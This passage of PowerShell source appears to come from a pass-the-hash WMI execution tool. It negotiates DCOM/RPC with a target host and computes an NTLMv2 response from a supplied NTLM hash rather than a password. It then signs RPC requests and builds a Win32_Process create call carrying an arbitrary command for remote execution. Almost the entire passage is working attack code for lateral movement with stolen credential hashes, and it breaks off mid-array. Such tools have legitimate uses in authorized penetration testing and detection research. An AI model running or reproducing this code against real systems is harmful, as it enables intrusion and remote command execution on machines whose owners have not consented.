            $target_search = $target_search -replace "-",""
            $WMI_message = [System.BitConverter]::ToString($WMI_client_receive)
            $WMI_message = $WMI_message -replace "-",""
            $target_index = $WMI_message.IndexOf($target_search)

            if($target_index -lt 1)
            {
                $target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList

                ForEach($IP_address in $target_address_list)
                {
                    $target_short = $IP_address.IPAddressToString
                    $target_unicode = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes($target_short + "[")
                    $target_search = [System.BitConverter]::ToString($target_unicode)
                    $target_search = $target_search -replace "-",""
                    $target_index = $WMI_message.IndexOf($target_search)

                    if($target_index -gt 0)
                    {
                        break
                    }

                }

            }


            if($target_index -gt 0)
            {
                $target_bytes_index = $target_index / 2
                $WMI_random_port = $WMI_client_receive[($target_bytes_index + $target_unicode.Length)..($target_bytes_index + $target_unicode.Length + 8)]
                $WMI_random_port = [System.BitConverter]::ToString($WMI_random_port)
                $WMI_random_port_end_index = $WMI_random_port.IndexOf("-5D")

                if($WMI_random_port_end_index -gt 0)
                {
                    $WMI_random_port = $WMI_random_port.SubString(0,$WMI_random_port_end_index)
                }

                $WMI_random_port = $WMI_random_port -replace "-00",""
                $WMI_random_port = $WMI_random_port.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                [Int]$WMI_random_port_int = -join $WMI_random_port
                $MEOW = [System.BitConverter]::ToString($WMI_client_receive)
                $MEOW = $MEOW -replace "-",""
                $MEOW_index = $MEOW.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820")
                $MEOW_bytes_index = $MEOW_index / 2
                $OXID = $WMI_client_receive[($MEOW_bytes_index + 32)..($MEOW_bytes_index + 39)]
                $IPID = $WMI_client_receive[($MEOW_bytes_index + 48)..($MEOW_bytes_index + 63)]
                $OXID = [System.BitConverter]::ToString($OXID)
                $OXID = $OXID -replace "-",""
                $OXID_index = $MEOW.IndexOf($OXID,$MEOW_index + 100)
                $OXID_bytes_index = $OXID_index / 2
                $object_UUID = $WMI_client_receive[($OXID_bytes_index + 12)..($OXID_bytes_index + 27)]
                $WMI_client_random_port = New-Object System.Net.Sockets.TCPClient
                $WMI_client_random_port.Client.ReceiveTimeout = 30000
            }

            if($WMI_random_port)
            {



                try
                {
                    $WMI_client_random_port.Connect($target_long,$WMI_random_port_int)
                }
                catch
                {
                    Write-Output "$target_long`:$WMI_random_port_int did not respond"
                }

            }
            else
            {
                Write-Output "Random port extraction failure"
            }

        }
        else
        {
            Write-Output "Something went wrong"
        }

        if($WMI_client_random_port.Connected)
        {
            $WMI_client_random_port_stream = $WMI_client_random_port.GetStream()
            $packet_RPC = Get-PacketRPCBind 2 0xd0,0x16 0x03 0x00,0x00 0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 0x00,0x00
            $packet_RPC["RPCBind_FragLength"] = 0xd0,0x00
            $packet_RPC["RPCBind_AuthLength"] = 0x28,0x00
            $packet_RPC["RPCBind_AuthLevel"] = 0x04
            $packet_RPC["RPCBind_NegotiateFlags"] = 0x97,0x82,0x08,0xa2
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $WMI_client_send = $RPC
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()
            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
            $assoc_group = $WMI_client_receive[20..23]
            $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
            $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
            $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
            $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
            $WMI_domain_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
            $WMI_target_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
            $WMI_session_ID = $WMI_client_receive[44..51]
            $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
            $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
            $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (get-childitem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain = $Domain
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
            $auth_username_length = $auth_username_length[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
            $auth_hostname_length = $auth_hostname_length[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $WMI_target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $WMI_target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $WMI_NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
            $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)

            $client_signing_constant = 0x73,0x65,0x73,0x73,0x69,0x6f,0x6e,0x20,0x6b,0x65,0x79,0x20,0x74,0x6f,0x20,
                                        0x63,0x6c,0x69,0x65,0x6e,0x74,0x2d,0x74,0x6f,0x2d,0x73,0x65,0x72,0x76,
                                        0x65,0x72,0x20,0x73,0x69,0x67,0x6e,0x69,0x6e,0x67,0x20,0x6b,0x65,0x79,
                                        0x20,0x6d,0x61,0x67,0x69,0x63,0x20,0x63,0x6f,0x6e,0x73,0x74,0x61,0x6e,
                                        0x74,0x00

            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $client_signing_key = $MD5.ComputeHash($session_base_key + $client_signing_constant)
            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
            $NTLMv2_response_length = $NTLMv2_response_length[0,1]
            $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
            $WMI_session_key_length = 0x00,0x00
            $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $WMI_session_key_length +
                                    $WMI_session_key_length +
                                    $WMI_session_key_offset +
                                    $WMI_negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            $HMAC_MD5.key = $client_signing_key
            [Byte[]]$sequence_number = 0x00,0x00,0x00,0x00
            $packet_RPC = Get-PacketRPCAUTH3 $NTLMSSP_response
            $packet_RPC["RPCAUTH3_CallID"] = 0x02,0x00,0x00,0x00
            $packet_RPC["RPCAUTH3_AuthLevel"] = 0x04
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $WMI_client_send = $RPC
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()
            $packet_RPC = Get-PacketRPCRequest 0x83 76 16 4 0x02,0x00,0x00,0x00 0x00,0x00 0x03,0x00 $object_UUID
            $packet_rem_query_interface = Get-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
            $packet_NTLMSSP_verifier = Get-PacketNTLMSSPVerifier 4 0x04 $sequence_number
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $rem_query_interface = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
            $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
            $HMAC_MD5.key = $client_signing_key
            $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $rem_query_interface + $NTLMSSP_verifier[0..11])
            $RPC_signature = $RPC_signature[0..7]
            $packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = $RPC_signature
            $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
            $WMI_client_send = $RPC + $rem_query_interface + $NTLMSSP_verifier
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()
            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
            $WMI_client_stage = 'exit'

            if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
            {
                Write-Output "$output_username WMI access denied on $target_long"
            }
            elseif($WMI_client_receive[2] -eq 3)
            {
                $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                $error_code = $error_code -replace "-",""
                Write-Output "Failed with error code 0x$error_code"
            }
            elseif($WMI_client_receive[2] -eq 2)
            {
                $WMI_data = [System.BitConverter]::ToString($WMI_client_receive)
                $WMI_data = $WMI_data -replace "-",""
                $OXID_index = $WMI_data.IndexOf($OXID)
                $OXID_bytes_index = $OXID_index / 2
                $object_UUID2 = $WMI_client_receive[($OXID_bytes_index + 16)..($OXID_bytes_index + 31)]
                $WMI_client_stage = 'AlterContext'
            }
            else
            {
                Write-Output "Something went wrong"
            }


            $request_split_index = 5500

            :WMI_execute_loop while ($WMI_client_stage -ne 'exit')
            {

                if($WMI_client_receive[2] -eq 3)
                {
                    $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                    $error_code = $error_code -replace "-",""
                    Write-Output "Failed with error code 0x$error_code"
                    $WMI_client_stage = 'exit'
                }

                switch ($WMI_client_stage)
                {

                    'AlterContext'
                    {

                        switch ($sequence_number[0])
                        {

                            0
                            {
                                $alter_context_call_ID = 0x03,0x00,0x00,0x00
                                $alter_context_context_ID = 0x02,0x00
                                $alter_context_UUID = 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
                                $WMI_client_stage_next = 'Request'
                            }

                            1
                            {
                                $alter_context_call_ID = 0x04,0x00,0x00,0x00
                                $alter_context_context_ID = 0x03,0x00
                                $alter_context_UUID = 0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20
                                $WMI_client_stage_next = 'Request'
                            }

                            6
                            {
                                $alter_context_call_ID = 0x09,0x00,0x00,0x00
                                $alter_context_context_ID = 0x04,0x00
                                $alter_context_UUID = 0x99,0xdc,0x56,0x95,0x8c,0x82,0xcf,0x11,0xa3,0x7e,0x00,0xaa,0x00,0x32,0x40,0xc7
                                $WMI_client_stage_next = 'Request'
                            }

                        }

                        $packet_RPC = Get-PacketRPCAlterContext $assoc_group $alter_context_call_ID $alter_context_context_ID $alter_context_UUID
                        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                        $WMI_client_send = $RPC
                        $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
                        $WMI_client_random_port_stream.Flush()
                        $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                        $WMI_client_stage = $WMI_client_stage_next
                    }

                    'Request'
                    {
                        $request_split = $false

                        switch ($sequence_number[0])
                        {

                            0
                            {
                                $sequence_number = 0x01,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 12
                                $request_call_ID = 0x03,0x00,0x00,0x00
                                $request_context_ID = 0x02,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID2
                                $hostname_length = [System.BitConverter]::GetBytes($auth_hostname.Length + 1)
                                $WMI_client_stage_next = 'AlterContext'

                                if([Bool]($auth_hostname.Length % 2))
                                {
                                    $auth_hostname_bytes += 0x00,0x00
                                }
                                else
                                {
                                    $auth_hostname_bytes += 0x00,0x00,0x00,0x00
                                }

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                $hostname_length +
                                                0x00,0x00,0x00,0x00 +
                                                $hostname_length +
                                                $auth_hostname_bytes +
                                                $process_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00

                            }

                            1
                            {
                                $sequence_number = 0x02,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 8
                                $request_call_ID = 0x04,0x00,0x00,0x00
                                $request_context_ID = 0x03,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $IPID
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

                            }

                            2
                            {
                                $sequence_number = 0x03,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x05,0x00,0x00,0x00
                                $request_context_ID = 0x03,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID
                                [Byte[]]$WMI_namespace_length = [System.BitConverter]::GetBytes($target_short.Length + 14)
                                [Byte[]]$WMI_namespace_unicode = [System.Text.Encoding]::Unicode.GetBytes("\\$target_short\root\cimv2")
                                $WMI_client_stage_next = 'Request'

                                if([Bool]($target_short.Length % 2))
                                {
                                    $WMI_namespace_unicode += 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    $WMI_namespace_unicode += 0x00,0x00
                                }

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                $WMI_namespace_length +
                                                0x00,0x00,0x00,0x00 +
                                                $WMI_namespace_length +
                                                $WMI_namespace_unicode +
                                                0x04,0x00,0x02,0x00,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x09,
                                                0x00,0x00,0x00,0x65,0x00,0x6e,0x00,0x2d,0x00,0x55,0x00,0x53,0x00,
                                                0x2c,0x00,0x65,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00

                            }

                            3
                            {
                                $sequence_number = 0x04,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 8
                                $request_call_ID = 0x06,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x05,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'Request'
                                $WMI_data = [System.BitConverter]::ToString($WMI_client_receive)
                                $WMI_data = $WMI_data -replace "-",""
                                $OXID_index = $WMI_data.IndexOf($OXID)
                                $OXID_bytes_index = $OXID_index / 2
                                $IPID2 = $WMI_client_receive[($OXID_bytes_index + 16)..($OXID_bytes_index + 31)]
                                $packet_rem_release = Get-PacketDCOMRemRelease $causality_ID_bytes $object_UUID2 $IPID
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_release
                            }

                            4
                            {
                                $sequence_number = 0x05,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 4
                                $request_call_ID = 0x07,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'Request'
                                $packet_rem_query_interface = Get-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x9e,0xc1,0xfc,0xc3,0x70,0xa9,0xd2,0x11,0x8b,0x5a,0x00,0xa0,0xc9,0xb7,0xc9,0xc4
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                            }

                            5
                            {
                                $sequence_number = 0x06,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 4
                                $request_call_ID = 0x08,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'AlterContext'
                                $packet_rem_query_interface = Get-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x83,0xb2,0x96,0xb1,0xb4,0xba,0x1a,0x10,0xb6,0x9c,0x00,0xaa,0x00,0x34,0x1d,0x07
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                            }

                            6
                            {
                                $sequence_number = 0x07,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x09,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID2
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00

                            }

                            7
                            {
                                $sequence_number = 0x08,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x10,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID2
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00

                            }

                            {$_ -ge 8}
                            {
                                $sequence_number = 0x09,0x00,0x00,0x00
                                $request_auth_padding = 0
                                $request_call_ID = 0x0b,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x18,0x00
                                $request_UUID = $IPID2
                                [Byte[]]$stub_length = [System.BitConverter]::GetBytes($Command.Length + 1769)
                                $stub_length = $stub_length[0,1]
                                [Byte[]]$stub_length2 = [System.BitConverter]::GetBytes($Command.Length + 1727)
                                $stub_length2 = $stub_length2[0,1]
                                [Byte[]]$stub_length3 = [System.BitConverter]::GetBytes($Command.Length + 1713)
                                $stub_length3 = $stub_length3[0,1]
                                [Byte[]]$command_length = [System.BitConverter]::GetBytes($Command.Length + 93)
                                $command_length = $command_length[0,1]
                                [Byte[]]$command_length2 = [System.BitConverter]::GetBytes($Command.Length + 16)
                                $command_length2 = $command_length2[0,1]
                                [Byte[]]$command_bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)
                                [String]$command_padding_check = $Command.Length / 4

                                if($command_padding_check -like "*.75")
                                {
                                    $command_bytes += 0x00
                                }
                                elseif($command_padding_check -like "*.5")
                                {
                                    $command_bytes += 0x00,0x00
                                }
                                elseif($command_padding_check -like "*.25")
                                {
                                    $command_bytes += 0x00,0x00,0x00
                                }
                                else
                                {
                                    $command_bytes += 0x00,0x00,0x00,0x00
                                }

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x55,0x73,0x65,0x72,
                                                0x06,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x63,
                                                0x00,0x72,0x00,0x65,0x00,0x61,0x00,0x74,0x00,0x65,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                $stub_length +
                                                0x00,0x00 +
                                                $stub_length +
                                                0x00,0x00,0x4d,0x45,0x4f,0x57,0x04,0x00,0x00,0x00,0x81,0xa6,0x12,
                                                0xdc,0x7f,0x73,0xcf,0x11,0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24,
                                                0x12,0xf8,0x90,0x45,0x3a,0x1d,0xd0,0x11,0x89,0x1f,0x00,0xaa,0x00,
                                                0x4b,0x2e,0x24,0x00,0x00,0x00,0x00 +
                                                $stub_length2 +
                                                0x00,0x00,0x78,0x56,0x34,0x12 +
                                                $stub_length3 +
                                                0x00,0x00,0x02,0x53,
                                                0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x04,
                                                0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x0e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0x03,0x00,0x00,0x00,0x2a,0x00,0x00,0x00,
                                                0x15,0x01,0x00,0x00,0x73,0x01,0x00,0x00,0x76,0x02,0x00,0x00,0xd4,
                                                0x02,0x00,0x00,0xb1,0x03,0x00,0x00,0x15,0xff,0xff,0xff,0xff,0xff,
                                                0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x12,0x04,0x00,0x80,0x00,0x5f,
                                                0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,0x52,0x53,0x00,0x00,
                                                0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,0x69,0x6e,0x65,
                                                0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,
                                                0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,
                                                0x00,0x00,0x49,0x6e,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x5e,0x00,0x00,
                                                0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0x94,
                                                0x00,0x00,0x00,0x00,0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,
                                                0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,
                                                0x68,0x72,0x65,0x61,0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,
                                                0x6e,0x73,0x7c,0x6c,0x70,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,
                                                0x69,0x6e,0x65,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,0x6e,0x67,
                                                0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,0x00,0x00,
                                                0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,
                                                0x5e,0x00,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0xca,0x00,
                                                0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x8c,0x00,0x00,0x00,0x00,0x49,
                                                0x44,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,
                                                0x00,0x00,0x00,0x59,0x01,0x00,0x00,0x5e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0xca,0x00,0x00,0x00,0x02,0x08,0x20,0x00,
                                                0x00,0x8c,0x00,0x00,0x00,0x11,0x01,0x00,0x00,0x11,0x03,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,
                                                0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x04,0x00,0x00,0x00,0x00,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,
                                                0x44,0x69,0x72,0x65,0x63,0x74,0x6f,0x72,0x79,0x00,0x00,0x73,0x74,
                                                0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,0x00,0x00,0x00,0x49,0x6e,
                                                0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,
                                                0x00,0x00,0x85,0x01,0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,
                                                0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0xe2,0x01,0x00,0x00,0x00,
                                                0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,0x50,0x72,0x6f,0x63,
